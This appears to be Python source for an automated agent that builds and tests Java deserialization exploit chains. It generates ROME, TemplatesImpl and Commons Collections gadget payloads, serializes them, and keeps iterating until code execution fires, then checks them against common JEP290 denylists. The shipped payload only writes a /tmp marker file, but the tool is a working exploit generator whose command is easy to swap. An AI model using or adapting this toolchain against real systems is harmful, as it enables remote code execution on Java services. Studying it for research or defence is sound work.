"""JGDPoCGenAgent — 武器化 PoC 生成 (R39/R41, agent 默认产出)。

内建完整性约束 (用户裁决 R42): 产出必须完整 — 每条链迭代尾巴候选
(toString 尾巴 / hashCode 尾巴家族 / CC 家族) 直到 RCE_DEMO_FIRED
或候选穷尽并记录全部尝试; 不依赖任何外部人工补救。

链形态:
  载体(BAVE=toString触发/JDK≤11, HashMap=hashCode触发/跨JDK)
  → 桥(已确认 T1/T2) → 尾巴候选 → TemplatesImpl.defineClass → 静态块
  → 良性演示效果(写标记文件)

产物: pocs/<chain-id>/payload.ser + README.md + poc_results.json
良性边界: payload 只写 /tmp 标记文件与 stdout。
"""
from __future__ import annotations

import json
import subprocess
import sys
import time
import zipfile
from pathlib import Path

HERE = Path(__file__).parent
sys.path.insert(0, str(HERE))

import llm
import matrix_agent as ma
import scope

DYN = Path.home() / "jgd/dyn"
ECJ = Path.home() / "jgd/tools/ecj.jar"
POC_DIR = scope.scoped_dir(HERE / "pocs")
CP = f"{DYN}:{ma.corpus_dir()}/*:{ma.CLASSIC}/*:{ma.TOP50}/*"
JAVA_OPTS = ["-Xmx256m", "--add-opens", "java.base/sun.reflect=ALL-UNNAMED",
             "--add-opens", "java.management/javax.management=ALL-UNNAMED"]
JDK17_OPENS = [
    "--add-opens", "java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED",
    "--add-exports", "java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED",
]
TEMPLATES_EXPORTS = [
    "--add-exports", "java.xml/com.sun.org.apache.xalan.internal.xsltc=ALL-UNNAMED",
    "--add-exports", "java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED",
    "--add-exports", "java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED",
    "--add-exports", "java.xml/com.sun.org.apache.xml.internal.serializer=ALL-UNNAMED",
    "--add-exports", "java.xml/com.sun.org.apache.xml.internal.dtm=ALL-UNNAMED",
]

MARKER = "/tmp/jgd_poc_fired"


def jdk(java11: bool) -> str:
    p = ("/usr/lib/jvm/java-11-openjdk-amd64/bin/java" if java11 else
         "/usr/lib/jvm/java-17-openjdk-amd64/bin/java")
    return p if Path(p).exists() else "java"


def sh(cmd, timeout=120, cwd=HERE):
    p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, cwd=cwd)
    return p.returncode, p.stdout + p.stderr


PAYLOAD_SRC = """import java.io.File;
import java.nio.file.Files;
import java.nio.file.Paths;

public class PL{tag} extends
        com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet {{
    static {{
        try {{
            Files.write(Paths.get("{marker}"),
                ("FIRED:" + System.currentTimeMillis()).getBytes());
            System.out.println("[PoC] RCE closure fired: "
                + new File("{marker}").getAbsolutePath());
            // R44(ds): 自打印全链调用栈 — 入口→gadget→defineClass→payload
            for (StackTraceElement f : new Throwable().getStackTrace())
                System.out.println("[PoC-frame] " + f);
        }} catch (Exception e) {{
            System.out.println("[PoC] effect failed: " + e);
        }}
    }}
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document,
        com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) {{}}
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document,
        com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator,
        com.sun.org.apache.xml.internal.serializer.SerializationHandler handler) {{}}
}}
"""

BUILD_TAIL = """import java.io.*;
import java.lang.reflect.*;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class PT{n} {{
    static void set(Object o, String f, Object v) throws Exception {{
        Field fl = o.getClass().getDeclaredField(f);
        fl.setAccessible(true); fl.set(o, v);
    }}
    @SuppressWarnings("unchecked")
    static Object rome_tail(byte[] tb) throws Exception {{
        Object templates = Class.forName(
            "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl")
            .getDeclaredConstructor().newInstance();
        set(templates, "_bytecodes", new byte[][] {{ tb }});
        set(templates, "_name", "p");
        set(templates, "_class", null);
        try {{
            set(templates, "_tfactory", Class.forName(
                "com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl")
                .getDeclaredConstructor().newInstance());
        }} catch (Throwable ig) {{}}
        return Class.forName("com.sun.syndication.feed.impl.ObjectBean")
            .getDeclaredConstructor(Class.class, Object.class)
            .newInstance(Class.forName("javax.xml.transform.Templates"),
                         templates);
    }}
    @SuppressWarnings("unchecked")
    static Object cc_tail(String cmd) throws Exception {{
        Class<?> it = Class.forName(
            "org.apache.commons.collections.functors.InvokerTransformer");
        Class<?> ct = Class.forName(
            "org.apache.commons.collections.functors.ConstantTransformer");
        Object t1 = it.getConstructor(String.class, Class[].class, Object[].class)
            .newInstance("getRuntime", null, null);
        Object t2 = it.getConstructor(String.class, Class[].class, Object[].class)
            .newInstance("exec", new Class[]{{ String.class }},
                         new Object[]{{ cmd }});
        Object c0 = ct.getConstructor(Object.class)
            .newInstance(Runtime.class);
        java.io.Serializable[] arr = new java.io.Serializable[] {{
            (java.io.Serializable) c0, (java.io.Serializable) t1,
            (java.io.Serializable) t2 }};
        Object chain = Class.forName(
            "org.apache.commons.collections.functors.ChainedTransformer")
            .getConstructor(new Class[]{{ java.io.Serializable[].class }})
            .newInstance(new Object[]{{ arr }});
        Map lazy = (Map) Class.forName(
            "org.apache.commons.collections.map.LazyMap")
            .getDeclaredMethod("decorate", Map.class,
                Class.forName("org.apache.commons.collections.Transformer"))
            .invoke(null, new HashMap(), chain);
        return Class.forName(
            "org.apache.commons.collections.keyvalue.TiedMapEntry")
            .getConstructor(Map.class, Object.class)
            .newInstance(lazy, "k");
    }}
    @SuppressWarnings("unchecked")
    static Object hash_tail_rome(byte[] tb) throws Exception {{
        // R42: hashCode 触发尾巴 — EqualsBean(_bean=ObjectBean(Templates)).
        // hashCode 路径经 EqualsBean 分派最终触达 ObjectBean.toString→getter
        // (候选扫描实测, 不依赖理论)
        Object ob = rome_tail(tb);
        Class<?> c = Class.forName("com.sun.syndication.feed.impl.EqualsBean");
        Object eb;
        try {{ eb = c.getDeclaredConstructor().newInstance(); }}
        catch (Throwable t) {{
            Constructor<?> ctor = sun.reflect.ReflectionFactory
                .getReflectionFactory()
                .newConstructorForSerialization(c,
                    Object.class.getDeclaredConstructor());
            ctor.setAccessible(true); eb = ctor.newInstance();
        }}
        for (Field f : c.getDeclaredFields()) {{
            if (Modifier.isStatic(f.getModifiers())
                    || Modifier.isTransient(f.getModifiers())) continue;
            if (f.getType() == Object.class) {{
                f.setAccessible(true); f.set(eb, ob);
            }}
        }}
        return eb;
    }}
    public static void main(String[] args) throws Exception {{
        String mode = args[0];
        String tailKind = args[1];
        byte[] tb = args[2].equals("-") ? null
            : Base64.getDecoder().decode(args[2]);
        Object tail;
        if ("rome_tostring".equals(tailKind)) {{
            tail = rome_tail(tb);
        }} else if ("rome_equalsbean_hash".equals(tailKind)) {{
            tail = hash_tail_rome(tb);
        }} else {{
            tail = cc_tail("touch " + "{marker}");
        }}
        Object root;
        if (mode.startsWith("bave:")) {{
            Object b = make_bridge(mode.substring(5), tail);
            javax.management.BadAttributeValueExpException e =
                new javax.management.BadAttributeValueExpException(null);
            set(e, "val", b);
            root = e;
        }} else {{
            Object b = make_bridge(mode.substring(3), tail);
            java.util.HashMap<Object, Object> m = new java.util.HashMap<>();
            m.put(b, "v");
            root = m;
        }}
        try (ObjectOutputStream oos = new ObjectOutputStream(
                new FileOutputStream(args[3]))) {{
            oos.writeObject(root);
        }}
        System.out.println("BUILD_OK");
    }}
    static Object make_bridge(String cls, Object tail) throws Exception {{
        // R45 泛化装配: 构造器捷径 → 字段类型感知注入
        // (Object 直注 / 接口→Proxy 适配器路由 tail.toString / 具体不兼容→跳过)
        Class<?> c = Class.forName(cls);
        try {{
            for (Constructor<?> ct : c.getConstructors()) {{
                Class<?>[] ps = ct.getParameterTypes();
                if (ps.length == 2 && ps[0] == Object.class
                        && ps[1] == long.class)
                    return ct.newInstance(tail, 0L);
                if (ps.length == 2 && ps[0] == Object.class
                        && ps[1] == Object.class)
                    return ct.newInstance(tail, tail);
                if (ps.length == 1 && ps[0] == Object.class)
                    return ct.newInstance(tail);
            }}
            Object b = c.getDeclaredConstructor().newInstance();
            if (!inject_fields(b, tail)) {{
                Constructor<?> ctor = sun.reflect.ReflectionFactory
                    .getReflectionFactory()
                    .newConstructorForSerialization(c,
                        Object.class.getDeclaredConstructor());
                ctor.setAccessible(true);
                b = ctor.newInstance();
                inject_fields(b, tail);
            }}
            return b;
        }} catch (Throwable t) {{ throw new RuntimeException(t); }}
    }}
    static boolean inject_fields(Object host, Object tail) throws Exception {{
        boolean any = false;
        for (Field f : host.getClass().getDeclaredFields()) {{
            if (Modifier.isStatic(f.getModifiers())
                    || Modifier.isTransient(f.getModifiers())) continue;
            Class<?> ft = f.getType();
            Object v;
            if (ft == Object.class || ft.isInstance(tail)) {{
                v = tail;
            }} else if (ft.isInterface()) {{
                v = Proxy.newProxyInstance(ft.getClassLoader(),
                    new Class[]{{ ft }}, new TailAdapter(tail));
            }} else {{
                continue;
            }}
            try {{ f.setAccessible(true); f.set(host, v);
                  System.out.println("INJ " + f.getName() + ":" + ft.getSimpleName());
                  any = true; }}
            catch (Throwable ig) {{}}
        }}
        return any;
    }}
    static class TailAdapter implements InvocationHandler {{
        final Object tail;
        TailAdapter(Object t) {{ tail = t; }}
        public Object invoke(Object p, Method m, Object[] a) throws Throwable {{
            try {{ return tail.getClass().getMethod(m.getName(),
                    m.getParameterTypes()).invoke(tail, a); }}
            catch (Throwable t) {{ return tail.toString(); }}
        }}
    }}
}}
"""

FIRE_SRC = """import java.io.*;
import java.nio.file.*;

public class PF{n} {{
    public static void main(String[] args) throws Exception {{
        String marker = "{marker}";
        try {{ Files.deleteIfExists(Paths.get(marker)); }} catch (Exception e) {{}}
        try (ObjectInputStream ois = new ObjectInputStream(
                new FileInputStream(args[0]))) {{
            ois.readObject();
        }}
        boolean fired = Files.exists(Paths.get(marker));
        System.out.println("DESER_OK fired=" + fired);
    }}
}}
"""


def compile_payload(jdk11: bool, tag: str) -> bytes | None:
    src = PAYLOAD_SRC.format(marker=MARKER, tag=tag)
    (DYN / f"PL{tag}.java").write_text(src, encoding="utf-8")
    # R40: payload 统一用 javac17 编译(-source/-target 匹配目标 JVM;
    # --release 不允许 add-exports) — JDK11 无 javac
    javac17 = Path("/usr/lib/jvm/java-17-openjdk-amd64/bin/javac")
    if javac17.exists():
        cmd = [str(javac17), *TEMPLATES_EXPORTS,
               "-source", "11" if jdk11 else "17",
               "-target", "11" if jdk11 else "17", "-nowarn",
               "-d", str(DYN), str(DYN / f"PL{tag}.java")]
    else:
        cmd = [jdk(jdk11), *TEMPLATES_EXPORTS, "-jar", str(ECJ),
               "-17" if not jdk11 else "-11", "-nowarn", "-cp", CP,
               "-d", str(DYN), str(DYN / f"PL{tag}.java")]
    rc, out = sh(cmd, timeout=120)
    if rc != 0 or not (DYN / f"PL{tag}.class").exists():
        print(f"[poc] payload 编译失败: {out[-200:]}")
        return None
    return (DYN / f"PL{tag}.class").read_bytes()


def find_jar_for(cls_dot: str) -> str | None:
    """R41: 定位包含该类的语料 jar — PoC 构建用最小 CP,
    避免通配符 CP 上 shaded 变体抢注同名类。"""
    p = cls_dot.replace(".", "/") + ".class"
    for jar in sorted(ma.corpus_dir().glob("*.jar")):
        try:
            with zipfile.ZipFile(jar) as z:
                if p in z.namelist():
                    return str(jar)
        except Exception:
            continue
    return None


def tail_jars(mode: str, bridge: str) -> str:
    jars = [find_jar_for(bridge),
            find_jar_for("com.sun.syndication.feed.impl.ObjectBean"),
            find_jar_for("com.sun.syndication.feed.impl.EqualsBean"),
            find_jar_for("org.apache.commons.collections.keyvalue.TiedMapEntry")]
    uniq = [f"{DYN}"] + [j for j in dict.fromkeys(jars) if j]
    return ":".join(uniq)


def _attempt(chain_id: str, mode: str, bridge: str, jdk11: bool,
             tail_kind: str, b64: str) -> dict:
    """单次组装+点火尝试 (R42 完整性循环的一个候选)。
    R43: ser 由 Java 写 Linux 侧 DYN (DrvFs 上 Java 新建文件间歇失败),
    再由 Python 拷入 pocs/。"""
    out_dir = POC_DIR / chain_id
    out_dir.mkdir(parents=True, exist_ok=True)
    tag = f"{int(time.time()) % 100000}{abs(hash(chain_id + tail_kind)) % 97:02d}"
    ser_tmp = DYN / f"POC{tag}.ser"
    ser = out_dir / f"payload_{tail_kind}.ser"
    (DYN / f"PT{tag}.java").write_text(
        BUILD_TAIL.format(n=tag, marker=MARKER), encoding="utf-8")
    mini_cp = tail_jars(mode, bridge)
    rc, out = sh([jdk(jdk11), *JAVA_OPTS, *( [] if jdk11 else JDK17_OPENS),
                  "-jar", str(ECJ), "-11" if jdk11 else "-17", "-nowarn",
                  "-cp", mini_cp, "-d", str(DYN), str(DYN / f"PT{tag}.java")])
    if rc != 0:
        return {"tail_kind": tail_kind, "status": "TAIL_COMPILE_FAIL",
                "output": out[-150:]}
    Path(MARKER).unlink(missing_ok=True)
    rc, out = sh([jdk(jdk11), *JAVA_OPTS, *( [] if jdk11 else JDK17_OPENS),
                  "-cp", mini_cp, f"PT{tag}", mode, tail_kind, b64,
                  str(ser_tmp)], timeout=120)
    build_fired = Path(MARKER).exists()
    build_ok = "BUILD_OK" in out
    if ser_tmp.exists() and ser != ser_tmp:
        import shutil
        shutil.copyfile(ser_tmp, ser)

    (DYN / f"PF{tag}.java").write_text(
        FIRE_SRC.format(n=tag, marker=MARKER), encoding="utf-8")
    sh([jdk(jdk11), "-jar", str(ECJ), "-11" if jdk11 else "-17", "-nowarn",
        "-cp", CP, "-d", str(DYN), str(DYN / f"PF{tag}.java")])
    Path(MARKER).unlink(missing_ok=True)
    rc, out2 = sh([jdk(jdk11), *JAVA_OPTS, *( [] if jdk11 else JDK17_OPENS),
                   "-cp", mini_cp, f"PF{tag}", str(ser)], timeout=120)
    deser_fired = Path(MARKER).exists()
    status = ("RCE_DEMO_FIRED" if (build_fired or deser_fired)
              else "CHAIN_NOT_CLOSED")
    print(f"[poc:{chain_id}/{tail_kind}] ok={build_ok} "
          f"build_fired={build_fired} deser_fired={deser_fired} -> {status}")
    return {"tail_kind": tail_kind, "status": status,
            "fired_at_build": build_fired, "fired_at_deser": deser_fired,
            "build_output": out[-1200:], "fire_output": out2[-900:],
            "ser": str(ser) if ser.exists() else None}


def build_and_verify(chain_id: str, mode: str, bridge: str,
                     jdk11: bool) -> dict:
    """R42 内建完整性: 迭代尾巴候选直到 RCE_DEMO_FIRED 或穷尽记录。
    HashMap(hashCode 触发) 与 BAVE(toString 触发) 的候选序不同;
    候选失败原因全部留档供 ds 审计。"""
    tag = f"{int(time.time()) % 100000}{abs(hash(chain_id)) % 97:02d}"
    tb = compile_payload(jdk11, tag)
    if not tb:
        return {"chain": chain_id, "status": "PAYLOAD_COMPILE_FAIL"}
    import base64
    b64 = base64.b64encode(tb).decode()
    order = (["rome_equalsbean_hash", "rome_tostring", "cc3"]
             if mode.startswith("hm:")
             else ["rome_tostring", "rome_equalsbean_hash", "cc3"])
    attempts = []
    for tk in order:
        r = _attempt(chain_id, mode, bridge, jdk11, tk, b64)
        attempts.append(r)
        if r.get("status") == "RCE_DEMO_FIRED":
            return {"chain": chain_id, "status": "RCE_DEMO_FIRED",
                    "closed_by_tail": tk, "mode": mode, "bridge": bridge,
                    "jdk": "11" if jdk11 else "17",
                    "fired_at_build": r.get("fired_at_build"),
                    "fired_at_deser": r.get("fired_at_deser"),
                    "ser": r.get("ser"),
                    "attempts": attempts,
                    "completeness": "agent-internal tail loop (R42)"}
    return {"chain": chain_id, "status": "CHAIN_NOT_CLOSED",
            "mode": mode, "bridge": bridge, "jdk": "11" if jdk11 else "17",
            "attempts": attempts}


CHAINS = [
    {"id": "t1-objlongpair-hashmap-rome",
     "mode": "hm:org.apache.activemq.artemis.api.core.ObjLongPair",
     "bridge": "org.apache.activemq.artemis.api.core.ObjLongPair",
     "jdk11": False,
     "tier": "T1(入口侧, ds entry_novel=true)"},
    {"id": "t2-mutableobj-bave-rome",
     "mode": "bave:cn.hutool.core.lang.mutable.MutableObj",
     "bridge": "cn.hutool.core.lang.mutable.MutableObj",
     "jdk11": True, "tier": "T2(ds CONFIRM)"},
    {"id": "t2-antlr-pair-bave-rome",
     "mode": "bave:org.antlr.v4.runtime.misc.Pair",
     "bridge": "org.antlr.v4.runtime.misc.Pair",
     "jdk11": True, "tier": "T2(ds CONFIRM)"},
]


def derive_chains(cap: int = 8) -> list[dict]:
    """R45 通用派生: 链清单从挖掘产物自动生成, 不再手工硬编码。

    优先级: jgd_entry_audit(T1桥) > jgd_chain_audit CONFIRM > DEPTH2 evidence 桥聚类代表。
    每桥: 静态取证(bridge_detail 触发方法) → 可用载体(toString→bave/hashCode→hm),
    needs_jdk → jdk11; 装配由泛化 make_bridge 按字段类型处理。
    """
    import matrix_agent as _ma
    prio: list[str] = []
    ea = scope.scoped(HERE / "jgd_entry_audit.json")
    if ea.exists():
        try:
            prio.append("org.apache.activemq.artemis.api.core.ObjLongPair")
        except Exception:
            pass
    ca = scope.scoped(HERE / "jgd_chain_audit.json")
    if ca.exists():
        try:
            prio += [r["cls"] for r in json.loads(ca.read_text(encoding="utf-8"))
                     if r.get("final_verdict") == "CONFIRM"]
        except Exception:
            pass
    cc = scope.DATA / "jgd_chain_state.json"
    if cc.exists():
        try:
            seen_bridge: dict[str, int] = {}
            for e in json.loads(cc.read_text(encoding="utf-8")).get("evidence", []):
                b = e.get("bridge", "")
                if b and "DEPTH2" in (e.get("result", {}).get("verdict") or ""):
                    seen_bridge[b.replace("/", ".")] = \
                        seen_bridge.get(b.replace("/", "."), 0) + 1
            prio += [b for b, _n in sorted(seen_bridge.items(),
                                           key=lambda kv: -kv[1])]
        except Exception:
            pass
    seen: set[str] = set()
    out: list[dict] = []
    for cls in [c for c in prio if not (c in seen or seen.add(c))][:cap * 2]:
        jp = find_jar_for(cls)
        if not jp:
            continue
        ev = _ma.static_probe(jp, cls)
        if ev.get("verdict") == "NOT_FOUND":
            continue
        trig = {t.get("trigger", "") for t in ev.get("bridge_detail", [])}
        needs = ev.get("needs_jdk", 11)
        if "toString" in trig and needs <= 11:
            mode, j11 = f"bave:{cls}", True
        elif "hashCode" in trig or "equals" in trig:
            mode, j11 = f"hm:{cls}", needs <= 11
        elif "toString" in trig:
            mode, j11 = f"bave:{cls}", False
        else:
            continue
        out.append({"id": cls.split(".")[-1].lower() + "-" +
                    ("bave" if mode.startswith("bave") else "hashmap"),
                    "mode": mode, "bridge": cls, "jdk11": j11,
                    "tier": "auto-derived(R45)"})
        if len(out) >= cap:
            break
    print(f"[derive] 挖掘产物派生 {len(out)} 条链: "
          f"{[c['bridge'].split('.')[-1] for c in out]}")
    return out


TAIL_LIBS = [
    ("rome", "com.sun.syndication.feed.impl.ObjectBean", "ROME ObjectBean→ToStringBean→getter"),
    ("commons-collections", "org.apache.commons.collections.functors.InvokerTransformer",
     "CC InvokerTransformer 链"),
    ("commons-collections4", "org.apache.commons.collections4.functors.InvokerTransformer",
     "CC4 InvokerTransformer 链"),
    ("groovy", "groovy.lang.GroovyShell", "GroovyShell.evaluate"),
    ("bsh", "bsh.Interpreter", "BeanShell eval"),
    ("freemarker", "freemarker.template.utility.Execute", "FreeMarker Execute"),
    ("jython", "org.python.util.PythonInterpreter", "Jython eval"),
]


def select_tail(corpus: Path) -> list[dict]:
    """R40: 尾巴自动选型 — 扫目标语料里实际在场的尾巴库。"""
    names = set()
    for jar in corpus.glob("*.jar"):
        try:
            with zipfile.ZipFile(jar) as z:
                nl = z.namelist()
                for lib, cls, _d in TAIL_LIBS:
                    if cls.replace(".", "/") + ".class" in nl:
                        names.add(lib)
        except Exception:
            continue
    return [{"lib": lib, "cls": cls, "desc": d, "present": lib in names}
            for lib, cls, d in TAIL_LIBS]


DENY_PATTERNS = [
    "org.apache.commons.collections", "org.apache.commons.beanutils",
    "com.sun.syndication", "org.springframework", "groovy", "bsh",
    "com.mchange", "org.codehaus.groovy",
]


def jep290_profile(chain_classes: list[str]) -> dict:
    """R40: JEP290 姿态建模 — 常见 denylist/仅java白名单下链是否可用。"""
    hits = sorted({c for c in chain_classes
                   for p in DENY_PATTERNS
                   if c.startswith(p.replace(".", "/")) or c.startswith(p)})
    only_java = all(c.startswith(("java/", "javax/", "jdk/", "[")) or "$Proxy"
                    in c for c in chain_classes)
    return {
        "no_filter": "PASS",
        "java_only_whitelist": ("PASS" if only_java else "BLOCKED"),
        "common_denylist": ("BLOCKED" if hits else "PASS"),
        "deny_hits": hits[:8],
        "note": "基于常见 filter 配置画像; 真实目标以其 ObjectInputFilter 为准"}


def ds_verify(results: list[dict]) -> dict:
    prompt = (
        "你是武器化 PoC 验收审计员。以下为本地良性演示(仅写标记文件)的构建与"
        "触发结果。请审计: 1) 链组装是否语义正确 2) fired 证据是否构成 RCE 闭环"
        "演示 3) 利用条件陈述是否准确。输出 JSON: {\"accepted\": true/false, "
        "\"notes\": \"...\"}\n\n"
        + json.dumps(results, ensure_ascii=False, indent=1))
    resp = llm.ask("ds", "你是严谨的利用可行性审计员。", prompt,
                   temperature=0.1, max_tokens=700)
    return llm.extract_json(resp.get("content") or "") or {"parse_fail": True}


def main() -> int:
    print("=" * 64)
    print("JGDPoCGenAgent: 武器化 PoC (良性演示) — agent 默认产出")
    print("=" * 64)
    import matrix_agent as _ma
    corpus = _ma.corpus_dir()
    tails = select_tail(corpus)
    print(f"[poc] 目标语料: {corpus}")
    for t in tails:
        print(f"  尾巴库 {t['lib']:<22} present={t['present']} ({t['desc']})")
    rome_present = next((t["present"] for t in tails if t["lib"] == "rome"),
                        False)
    chains = derive_chains(cap=8) if rome_present else []
    if not chains:
        chains = CHAINS
        print("[poc] 无挖掘产物可派生, 使用兜底三条")
    # R51(D5): 链间并行 — JVM 冷启动等待是 90% wall, 串行浪费
    from concurrent.futures import ThreadPoolExecutor
    with ThreadPoolExecutor(max_workers=3) as _pex:
        results = list(_pex.map(
            lambda c: build_and_verify(c["id"], c["mode"], c["bridge"],
                                       c["jdk11"]), chains))
    meta = {c["id"]: c for c in chains}

    lines = ["# JGD PoC 产物", "",
             "良性边界: payload 静态块只写 /tmp 标记文件 + stdout, 无破坏动作。",
             f"目标语料: `{corpus}`",
             "",
             "## 尾巴库在场情况",
             *[f"- {t['lib']}: {'✅ ' + t['desc'] if t['present'] else '❌ 不在场'}"
               for t in tails],
             ""]
    for r in results:
        c = meta[r["chain"]]
        jep = jep290_profile([
            r.get("bridge", "").replace(".", "/"),
            "com/sun/syndication/feed/impl/ObjectBean",
            "com/sun/syndication/feed/impl/ToStringBean",
            "javax/xml/transform/Templates",
        ]) if r.get("status") != "NO_TAIL_LIB_IN_TARGET" else {}
        lines += [
            f"## {r['chain']} — {r.get('status')}",
            f"- 分级: {c['tier']}",
            f"- 链: {'HashMap.readObject重哈希' if r.get('mode', '').startswith('hm:') else 'BAVE.readObject→toString'}"
            f" → `{r.get('bridge', '?')}` 转发字段 → ROME ObjectBean(Templates)"
            f" → getOutputProperties → TemplatesImpl.defineClass → payload 静态块",
            f"- JDK: {r.get('jdk', '?')} | build fired: {r.get('fired_at_build')}"
            f" | deser fired: {r.get('fired_at_deser')}",
            f"- JEP290 姿态: {json.dumps(jep, ensure_ascii=False)[:220]}",
            f"- 利用条件: 任意反序列化入口 + {r.get('bridge', '?').split('.')[0]}"
            f" 相关库在 classpath + ROME + JDK {r.get('jdk', '?')}",
            ""]
    POC_DIR.mkdir(exist_ok=True)
    (POC_DIR / "README.md").write_text("\n".join(lines), encoding="utf-8")

    acc = ds_verify(results)
    (POC_DIR / "poc_results.json").write_text(
        json.dumps({"results": results, "ds": acc, "ts":
                    time.strftime("%FT%T")}, ensure_ascii=False, indent=1),
        encoding="utf-8")
    print(f"\ndsh 验收: accepted={acc.get('accepted')}")
    for r in results:
        print(f"  {r['chain']}: {r.get('status')}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
